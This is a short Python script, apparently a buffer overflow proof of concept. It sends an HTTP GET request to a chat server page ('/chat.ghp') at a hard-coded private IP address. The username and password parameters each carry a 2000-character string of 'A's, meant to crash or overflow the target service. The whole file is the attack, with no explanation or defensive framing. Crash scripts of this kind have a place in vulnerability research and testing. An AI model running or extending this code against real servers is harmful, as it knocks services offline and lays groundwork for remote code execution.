#!/usr/bin/python

import struct
import socket



buf = "A"*2000

head  = "GET /chat.ghp?username="+buf+"&password="+buf+"&room=1 HTTP/1.1\r\n"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.72.167',80))
s.send(head + "\r\n\r\n")
s.close()

